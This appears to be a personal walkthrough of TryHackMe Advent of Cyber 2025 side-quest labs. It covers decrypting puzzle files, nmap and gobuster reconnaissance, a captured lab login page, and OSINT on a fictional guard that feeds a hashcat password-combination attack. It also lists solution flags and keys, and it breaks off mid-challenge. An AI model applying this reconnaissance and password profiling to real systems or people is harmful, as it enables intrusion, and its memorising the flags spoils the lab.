# TryHackMe Advent of Cyber 2025 Side Quests

## Linux CLI - Shells Bells

This challenge grants access to the sidequest through discovery of 3 Easter Eggs



- /home/eddie_knapp/mcskidy_note.txt.gpg

GPG archive we need to decrypt

- /home/eddie_knapp/.secret

GPG archive we need to decrypt

Desktop trash contains the fix_passfrag.sh script and /home/eddi_knapp/fix_passfrag_backups contain clues as to where the easter eggs are

cat /home/eddi_knapp/.bashrc or cat /home/eddi_knapp/.profile

`export PASSFRAG1="3ast3r"`

- /home/eddie_knapp/.secret_git

Indicates removal of a secret note

- git log 

show the commit history (you have to add the directory exception first as instructed)

git revert d12875c8b62e089320880b9b7e41d6765818af3d

cat secret_note.txt 

========================================
Private note from McSkidy
========================================
We hid things to buy time.
PASSFRAG2: -1s-

- /home/eddie_knapp/.secret_git.bak

- In /home/eddie_knapp/Pictures/.easter_egg

`PASSFRAG3: c0M1nG`

`3ast3r-1s-c0M1nG`

decrypt the note in /home/eddi_knapp/Documents/mcskidy_note.txt.gpg with this key

```
Congrats — you found all fragments and reached this file.

Below is the list that should be live on the site. If you replace the contents of
/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription

Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups

A final note — I don't know exactly where they have me, but there are *lots* of eggs
and I can smell chocolate in the air. Something big is coming.  — McSkidy

---

When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/websi
te_output.txt you could decode using the following command:

cat > /tmp/website_output.txt
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
cat /tmp/decoded_message.txt

Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy
```

Use the above list to overwrite the current contents of /home/socmas/2025/wishlist.txt

Then visit or refresh the page at http://10.65.180.235:8080 to get your unlock key

```
U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=
```

Now use the key from the note and OpenSSL as instructed to decode the unlock key above

```
Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

NEXT STEP:
If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
/home/eddi_knapp/.secret/dir

That hidden directory has been archived and encrypted with the FLAG.
Inside it you'll find the sidequest key.
```

go unlock the secret

cd /home/eddi_knapp/.secret
gpg -d dir.tar.gz.gpg > dir.tar.gz
tar xzvf dir.tar.gz
cd dir
do what you need to do to view the png e.g. mv sq1.png /home/ubuntu/Desktop

`now_you_see_me`


## The Great Disappearing Act


Nmap shows 

22

80 - Security terminal Nginx

	auth passes through /cgi-bin/login.sh

8080 - Security terminal simple python webserver


9001 SCADA terminal

telnet

### nmap results
```
Nmap scan report for 10.64.181.239
Host is up (0.00038s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: HopSec Asylum - Security Console
8000/tcp open  http-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 179
|     Vary: Accept-Language
|     Content-Language: en
|     X-Content-Type-Options: nosniff
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <title>Not Found</title>
|     </head>
|     <body>
|     <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
|     </body>
|     </html>
|   GenericLines, Help, RTSPRequest, SIPOptions, Socks5, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /posts/
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Vary: Accept-Language
|     Content-Language: en
|_    X-Content-Type-Options: nosniff
| http-title: Fakebook - Sign In
|_Requested resource was /accounts/login/?next=/posts/
8080/tcp open  http        SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: HopSec Asylum - Security Console
9001/tcp open  tor-orport?
| fingerprint-strings: 
|   NULL: 
|     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1 
|     [AUTHORIZED PERSONNEL ONLY] 
|     WARNING: This system controls critical infrastructure
|     access attempts are logged and monitored
|     Unauthorized access will result in immediate termination
|     Authentication required to access SCADA terminal
|     Provide authorization token from Part 1 to proceed
|_    [AUTH] Enter authorization token:
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.80%I=7%D=12/4%Time=69319A18%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReques
SF:t,C9,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nLocation:\x20/posts/\r\nX-Frame-Options:\x20DENY\r\nContent
SF:-Length:\x200\r\nVary:\x20Accept-Language\r\nContent-Language:\x20en\r\
SF:nX-Content-Type-Options:\x20nosniff\r\n\r\n")%r(FourOhFourRequest,160,"
SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\nX-Fra
SF:me-Options:\x20DENY\r\nContent-Length:\x20179\r\nVary:\x20Accept-Langua
SF:ge\r\nContent-Language:\x20en\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:\r\n\n<!doctype\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<title
SF:>Not\x20Found</title>\n</head>\n<body>\n\x20\x20<h1>Not\x20Found</h1><p
SF:>The\x20requested\x20resource\x20was\x20not\x20found\x20on\x20this\x20s
SF:erver\.</p>\n</body>\n</html>\n")%r(Socks5,1C,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\n\r\n")%r(HTTPOptions,C9,"HTTP/1\.0\x20302\x20Found\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/posts/\r\nX-
SF:Frame-Options:\x20DENY\r\nContent-Length:\x200\r\nVary:\x20Accept-Langu
SF:age\r\nContent-Language:\x20en\r\nX-Content-Type-Options:\x20nosniff\r\
SF:n\r\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%
SF:r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServe
SF:rCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1
SF:C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9001-TCP:V=7.80%I=7%D=12/4%Time=69319A18%P=x86_64-pc-linux-gnu%r(NU
SF:LL,34F,"\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\
SF:xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90
SF:\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9
SF:0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x
SF:90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\
SF:x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95
SF:\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x9
SF:5\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x
SF:95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\
SF:x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2
SF:\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe
SF:2\x95\x97\n\xe2\x95\x91\x20\x20\x20\x20\x20ASYLUM\x20GATE\x20CONTROL\x2
SF:0SYSTEM\x20-\x20SCADA\x20TERMINAL\x20v2\.1\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\xe2\x95\x91\n\xe2\x95\x91\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\[AUTHORIZED\x20PERSONNEL\x20ONLY\]\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x
SF:95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\
SF:x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2
SF:\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe
SF:2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\x
SF:e2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\
SF:xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90
SF:\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9
SF:0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x
SF:90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\
SF:x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95
SF:\x90\xe2\x95\x9d\n\n\[!\]\x20WARNING:\x20This\x20system\x20controls\x20
SF:critical\x20infrastructure\n\[!\]\x20All\x20access\x20attempts\x20are\x
SF:20logged\x20and\x20monitored\n\[!\]\x20Unauthorized\x20access\x20will\x
SF:20result\x20in\x20immediate\x20termination\n\n\[!\]\x20Authentication\x
SF:20required\x20to\x20access\x20SCADA\x20terminal\n\[!\]\x20Provide\x20au
SF:thorization\x20token\x20from\x20Part\x201\x20to\x20proceed\n\n\n\[AUTH\
SF:]\x20Enter\x20authorization\x20token:\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/4%OT=22%CT=1%CU=40219%PV=Y%DS=1%DC=T%G=Y%TM=69319AD
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7
OS:%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4
OS:B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2
OS:301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT     ADDRESS
1   0.41 ms 10.64.181.239

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.24 seconds

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT     ADDRESS
1   0.55 ms 10.65.147.219
```

gobuster dir -u http://<machine-ip>:13403 -w /usr/share/wordlists/dirbuster/directory-listings-2.3-medium 

found http://<machine-ip>:13403/describe download

http://<machine-ip>:13400 SIPS information disclosure

### Page HTML
```
  background:linear-gradient(180deg,#094443,#032121);
  border:2px solid #58c8bc;
  padding:20px;
  border-radius:4px;
  width:380px;
  text-align:center;
  color:#cafff7;
  position:relative;
}
.modal input{
  width:90%;
  margin-top:6px;
}
.error{
  color:#ffbbbb;
  font-size:12px;
  margin-top:6px;
}
.success{
  color:#7effa8;
  font-size:13px;
  margin-top:10px;
  background:rgba(143,224,155,0.12);
  padding:10px;
  border-radius:6px;
  border-left:4px solid #7effa8;
}
.flag{
  display:inline-block;
  margin-top:6px;
  font-weight:bold;
  letter-spacing:0.5px;
  color:#d9fff9;
  background:#011b1b;
  border:1px solid #17786e;
  padding:6px 8px;
}
.flag-row{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  flex-wrap:wrap;
  margin-top:6px;
}
.copybtn{
  margin-top:0;
  padding:4px 10px;
  font-size:11px;
  background:linear-gradient(180deg,#2aaea0,#04524c);
  color:#eaffff;
  border:1px solid #18a298;
}
button.emergency{
  margin-top:18px;
  padding:8px 26px;
  font-weight:bold;
  background:linear-gradient(180deg,#ff5c5c,#b30000);
  border:2px outset #b30000;
  color:#fff;
}
button.emergency:hover{
  filter:brightness(1.15);
}
.modal-close{
  position:absolute;
  right:8px;
  top:4px;
  cursor:pointer;
  font-size:18px;
  color:#cafff7;
}
.modal-close:hover{
  color:#ffbbbb;
}
#escapeDoor{
  display:none;
}
</style>
</head>
<body>
<div class="window" id="loginWindow">
  <div class="titlebar">HOPSEC ASYLUM - ACCESS TERMINAL</div>
  <div class="content">
    <h3>Welcome to HopSec Security Console</h3>
    <p>Please input credentials</p>
    <form method="POST" action="/cgi-bin/login.sh">
      <label>Login:</label>
      <input type="text" name="username" placeholder="Email" required>
      <label>Password:</label>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Enter</button>
    </form>
    <p style="font-size:12px;color:#7ce7d6;margin-top:8px;">
      Hopkins, please stop forgetting your password
    </p>
  </div>
</div>

<div id="mapScreen">
  <div class="titlebar">FACILITY MAP - AUTHORIZED PERSONNEL ONLY</div>
  <div class="map-wrap">
    <svg viewBox="0 0 900 720" aria-label="HopSec Asylum Map">
      <defs>
        <filter id="glow">
          <feGaussianBlur stdDeviation="2.5" result="b"/>
          <feMerge>
            <feMergeNode in="b"/>
            <feMergeNode in="SourceGraphic"/>
          </feMerge>
        </filter>
      </defs>
      <rect x="0" y="0" width="900" height="720" fill="#001a10"/>
      <g fill="#0b5f28" stroke="#00b25a" stroke-width="3">
        <rect x="60" y="140" width="250" height="180" rx="8"/>
        <rect x="60" y="340" width="250" height="180" rx="8"/>
        <rect x="340" y="260" width="220" height="220" rx="8"/>
        <rect x="620" y="140" width="220" height="180" rx="8"/>
        <rect x="620" y="360" width="220" height="200" rx="8"/>
        <rect x="300" y="520" width="300" height="110" rx="8"/>
      </g>
      <g fill="#c6ffd6" font-size="14" font-family="Lucida Console, Monaco, monospace" opacity="0.85">
        <text x="90" y="200">Cell Block</text>
        <text x="90" y="400">Cells / Storage</text>
        <text x="360" y="340">Lobby</text>
        <text x="650" y="200">Psych Ward</text>
        <text x="650" y="440">Psych Ward Exit</text>
        <text x="420" y="600">Main Corridor</text>
      </g>
    </svg>

    <button class="iconspot keybtn" data-door="hopper" data-label="Cells / Storage Key" onclick="openDoor('hopper')" style="--x:33%;--y:60%;">
      <img src="key.svg" alt="Cell key">
    </button>

    <button class="iconspot keybtn" data-door="psych" data-label="Psych Ward Exit Key" onclick="openDoor('psych')" style="--x:93%;--y:64%;">
      <img src="key.svg" alt="Psych ward key">
    </button>

    <button class="iconspot keybtn" data-door="exit" data-label="Asylum Exit Key" onclick="openDoor('exit')" style="--x:50%;--y:88%;">
      <img src="key.svg" alt="Asylum exit key">
    </button>

    <button class="iconspot" data-label="Camera 1 - Cell Block" onclick="viewCamera('1')" style="--x:20%;--y:30%;">
      <img src="camera.svg" alt="Security camera 1">
    </button>

    <button class="iconspot" data-label="Camera 2 - Lobby" onclick="viewCamera('2')" style="--x:50%;--y:50%;">
      <img src="camera.svg" alt="Security camera 2">
    </button>

    <button class="iconspot" data-label="Camera 3 - Psych Ward Exit" onclick="viewCamera('3')" style="--x:85%;--y:55%;">
      <img src="camera.svg" alt="Security camera 3">
    </button>

    <button class="iconspot" id="escapeDoor" data-label="Exit Facility" onclick="showEscapeModal()" style="--x:50%;--y:95%;">
      <img src="door.svg" alt="Exit door">
    </button>
  </div>
  <p style="text-align:center;color:#7ce7d6;font-size:12px;margin:6px 0 2px;">
    Tip: Hover keys and cameras for labels.
  </p>
</div>

<div class="modal-bg" id="modalBg">
  <div class="modal">
    <h3 id="doorTitle">Authorisation Required</h3>
    <div id="doorAuthBlock">
      <label id="doorSecretLabel">Secret:</label>
      <input type="password" id="doorSecret" placeholder="Enter code">
      <div style="margin-top:10px;">
        <button onclick="submitDoorSecret()">Submit</button>
        <button onclick="closeModal()">Cancel</button>
      </div>
      <div class="error" id="doorError"></div>
      <div class="success" id="doorSuccess" style="display:none"></div>
    </div>
    <div id="hopperBlock" style="display:none;margin-top:6px;">
      <p style="font-size:13px;line-height:1.4;">
        As an <span style="color:#7effa8;">authenticated user</span> you can remotely unlock patient cell doors in the event of an emergency.<br><br>
        <span style="color:#ffbbbb;font-weight:bold;">
          This control should only be used when you have explicit authorisation.
        </span>
      </p>
      <button class="emergency" onclick="unlockCell()">Unlock Cell Door</button>
      <div class="success" id="hopperFlag" style="display:none;">
        <div><strong>Cell door unlocked.</strong></div>
        <div class="flag-row">
          <span class="flag" id="hopperFlagText"></span>
          <button class="copybtn" onclick="copyById('hopperFlagText')">Copy</button>
        </div>
      </div>
      <div style="margin-top:10px;">
        <button onclick="closeModal()">Close</button>
      </div>
    </div>
  </div>
</div>

<div class="modal-bg" id="escapeModal">
  <div class="modal">
    <span class="modal-close" onclick="closeEscapeModal()">\u2715</span>
    <h3>HopSec Asylum \u2013 Final Escape Challenge</h3>
    <p style="font-size:13px;line-height:1.5;margin-top:6px;">
      To fully escape HopSec Asylum, you must provide all three flags you have collected.
    </p>
    <div style="text-align:left;margin-top:10px;font-size:12px;">
      <label for="flag1Input">Flag 1:</label>
      <input id="flag1Input" type="text" placeholder="Enter first flag">
      <label for="flag2Input" style="margin-top:10px;">Flag 2:</label>
      <input id="flag2Input" type="text" placeholder="Enter second flag">
      <label for="flag3Input" style="margin-top:10px;">Flag 3:</label>
      <input id="flag3Input" type="text" placeholder="Enter third flag">
    </div>
    <div style="margin-top:12px;">
      <button onclick="submitEscapeFlags()">Submit Flags</button>
    </div>
    <div class="error" id="escapeError"></div>
    <div class="success" id="escapeResult" style="display:none"></div>
  </div>
</div>

<script>
const unlocked={hopper:false,psych:false,exit:false};
const STORAGE_KEY="hopsec_unlocked_v1";
let currentDoor=null;

function saveUnlocked(){
  try{
    localStorage.setItem(STORAGE_KEY,JSON.stringify(unlocked));
  }catch(e){}
}
function loadUnlocked(){
  try{
    const raw=localStorage.getItem(STORAGE_KEY);
    if(!raw)return;
    const data=JSON.parse(raw);
    if(typeof data==="object"){
      if(typeof data.hopper==="boolean")unlocked.hopper=data.hopper;
      if(typeof data.psych==="boolean")unlocked.psych=data.psych;
      if(typeof data.exit==="boolean")unlocked.exit=data.exit;
    }
  }catch(e){}
}
function applyUnlockedVisuals(){
  Object.keys(unlocked).forEach(d=>{
    if(unlocked[d]){
      const btn=document.querySelector('.keybtn[data-door="'+d+'"]');
      if(btn)btn.classList.add("unlocked");
    }
  });
  if(unlocked.hopper&&unlocked.psych&&unlocked.exit){
    const ed=document.getElementById("escapeDoor");
    if(ed)ed.style.display="block";
  }
}
function markUnlocked(d){
  if(!unlocked[d]){
    unlocked[d]=true;
    const btn=document.querySelector('.keybtn[data-door="'+d+'"]');
    if(btn)btn.classList.add("unlocked");
    saveUnlocked();
    if(unlocked.hopper&&unlocked.psych&&unlocked.exit){
      const ed=document.getElementById("escapeDoor");
      if(ed)ed.style.display="block";
    }
  }
}
function openDoor(door){
  currentDoor=door;
  const title=document.getElementById("doorTitle");
  const authBlock=document.getElementById("doorAuthBlock");
  const hopperBlock=document.getElementById("hopperBlock");
  const hopperFlag=document.getElementById("hopperFlag");
  const err=document.getElementById("doorError");
  const succ=document.getElementById("doorSuccess");
  const label=document.getElementById("doorSecretLabel");
  const secretInput=document.getElementById("doorSecret");
  err.textContent="";
  succ.innerHTML="";
  succ.style.display="none";
  if(door==="hopper"){
    title.textContent="EMERGENCY CONTROL: Cell / Storage Wing";
    authBlock.style.display="none";
    hopperBlock.style.display="block";
    if(hopperFlag)hopperFlag.style.display="none";
  }else{
    hopperBlock.style.display="none";
    authBlock.style.display="block";
    secretInput.value="";
    if(door==="psych"){
      title.textContent="Door Access: Psych Ward Exit";
      label.textContent="Keycode:";
      secretInput.placeholder="Enter keycode";
      secretInput.type="password";
    }else{
      title.textContent="Door Access: Asylum Exit";
      label.textContent="SCADA Unlock Passcode:";
      secretInput.placeholder="Enter passcode";
      secretInput.type="password";
    }
  }
  document.getElementById("modalBg").style.display="flex";
}
function closeModal(){
  document.getElementById("modalBg").style.display="none";
}
async function unlockCell(){
  const flagDiv=document.getElementById("hopperFlag");
  const span=document.getElementById("hopperFlagText");
  if(flagDiv)flagDiv.style.display="none";
  try{
    const res=await fetch("/cgi-bin/key_flag.sh?door=hopper");
    const data=await res.json();
    if(data&&data.ok&&data.flag){
      if(span)span.textContent=data.flag;
      if(flagDiv)flagDiv.style.display="block";
      markUnlocked("hopper");
    }else{
      if(flagDiv){
        flagDiv.style.display="block";
        flagDiv.innerHTML="<div>Unlock succeeded, but flag could not be retrieved.</div>";
      }
      markUnlocked("hopper");
    }
  }catch(e){
    if(flagDiv){
      flagDiv.style.display="block";
      flagDiv.innerHTML="<div>Error contacting server for flag.</div>";
    }
  }
}
async function submitDoorSecret(){
  if(currentDoor!=="psych"&&currentDoor!=="exit")return;
  const secret=document.getElementById("doorSecret").value.trim();
  const e=document.getElementById("doorError");
  const s=document.getElementById("doorSuccess");
  e.textContent="";
  s.innerHTML="";
  s.style.display="none";
  if(!secret){
    e.textContent="Please enter a code.";
    return;
  }
  const endpoint=currentDoor==="psych"?"/cgi-bin/psych_check.sh":"/cgi-bin/exit_check.sh";
  try{
    const res=await fetch(endpoint,{
      method:"POST",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:"code="+encodeURIComponent(secret)
    });
    const data=await res.json();
    if(data&&data.error==="rate_limit"){
      e.textContent="Too many attempts. Please wait and try again.";
      return;
    }
    if(!data||!data.ok){
      e.textContent="Invalid code.";
      return;
    }
    const flag=data.flag||"";
    let html="";
    if(currentDoor==="psych"){
      html+='<div><strong>Psych Ward exit keycode accepted.</strong></div>';
      html+='<p style="margin:6px 0 4px;font-size:12px;">This is only the first part of your second flag. You will need to complete it elsewhere.</p>';
      if(flag){
        html+='<div class="flag-row"><span class="flag" id="psychFlagText"></span><button class="copybtn" onclick="copyById(\'psychFlagText\')">Copy</button></div>';
      }
      markUnlocked("psych");
    }else{
      html+='<div><strong>Asylum Exit SCADA passcode accepted.</strong></div>';
      if(flag){
        html+='<div class="flag-row"><span class="flag" id="exitFlagText"></span><button class="copybtn" onclick="copyById(\'exitFlagText\')">Copy</button></div>';
      }
      markUnlocked("exit");
    }
    s.innerHTML=html;
    s.style.display="block";
    if(currentDoor==="psych"&&flag){
      const span=document.getElementById("psychFlagText");
      if(span)span.textContent=flag;
    }
    if(currentDoor==="exit"&&flag){
      const span=document.getElementById("exitFlagText");
      if(span)span.textContent=flag;
    }
  }catch(err){
    e.textContent="Error contacting server.";
  }
}
function viewCamera(id){
  alert("Camera "+id+" feed is currently unavailable.");
}
function copyById(id){
  const el=document.getElementById(id);
  if(!el)return;
  const txt=el.textContent.trim();
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(txt).catch(()=>{});
  }else{
    const ta=document.createElement("textarea");
    ta.value=txt;
    document.body.appendChild(ta);
    ta.select();
    try{document.execCommand("copy");}catch(e){}
    document.body.removeChild(ta);
  }
}
function showEscapeModal(){
  const modal=document.getElementById("escapeModal");
  const err=document.getElementById("escapeError");
  const res=document.getElementById("escapeResult");
  const f1=document.getElementById("flag1Input");
  const f2=document.getElementById("flag2Input");
  const f3=document.getElementById("flag3Input");
  if(f1)f1.value="";
  if(f2)f2.value="";
  if(f3)f3.value="";
  err.textContent="";
  res.innerHTML="";
  res.style.display="none";
  modal.style.display="flex";
}
function closeEscapeModal(){
  document.getElementById("escapeModal").style.display="none";
}
async function submitEscapeFlags(){
  const f1=document.getElementById("flag1Input").value.trim();
  const f2=document.getElementById("flag2Input").value.trim();
  const f3=document.getElementById("flag3Input").value.trim();
  const err=document.getElementById("escapeError");
  const res=document.getElementById("escapeResult");
  err.textContent="";
  res.innerHTML="";
  res.style.display="none";
  if(!f1||!f2||!f3){
    err.textContent="Please enter all three flags.";
    return;
  }
  try{
    const resp=await fetch("/cgi-bin/escape_check.sh",{
      method:"POST",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:"flag1="+encodeURIComponent(f1)+"&flag2="+encodeURIComponent(f2)+"&flag3="+encodeURIComponent(f3)
    });
    const data=await resp.json();
    if(!data||!data.ok){
      err.textContent="One or more flags are incorrect.";
      return;
    }
    const url=data.invite_url||"";
    const code=data.invite_code||"";
    let html="<p>All three flags verified. Hopper grants you access to his next challenge.</p>";
    if(url){
      html+='<div class="flag-row"><span class="flag" id="escapeUrl"></span><button class="copybtn" onclick="copyById(\'escapeUrl\')">Copy URL</button></div>';
    }
    if(code){
      html+='<div class="flag-row"><span class="flag" id="escapeCode"></span><button class="copybtn" onclick="copyById(\'escapeCode\')">Copy invite code</button></div>';
    }
    res.innerHTML=html;
    res.style.display="block";
    if(url){
      const su=document.getElementById("escapeUrl");
      if(su)su.textContent=url;
    }
    if(code){
      const sc=document.getElementById("escapeCode");
      if(sc)sc.textContent=code;
    }
  }catch(e){
    err.textContent="Error contacting server.";
  }
}
async function checkSession(){
  const loginWin=document.getElementById("loginWindow");
  const map=document.getElementById("mapScreen");
  try{
    const res=await fetch("/cgi-bin/session_check.sh",{cache:"no-store"});
    const data=await res.json();
    if(data&&data.authed){
      loginWin.style.display="none";
      map.style.display="block";
    }else{
      loginWin.style.display="block";
      map.style.display="none";
    }
  }catch(e){
    loginWin.style.display="block";
    map.style.display="none";
  }
}
document.addEventListener("DOMContentLoaded",async function(){
  await checkSession();
  loadUnlocked();
  applyUnlockedVisuals();
});
</script>
</body>
</html>
```

Find Fake0book site on port 8000 and create account to see posts from hopkins

posts confirm hopkins email

`guard.hopkins@hopsecasylum.com`

and clue to a potential password for favorite pet

Pizza
Johnnyboy

also a picture with post it notes on a monitor but illegible

clue to use hasHcat password combinator 

Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy 

Hopkins tricked into pasting old password on fakebook 
Pizza1234$

Hopkins is 43 and was born in 1982

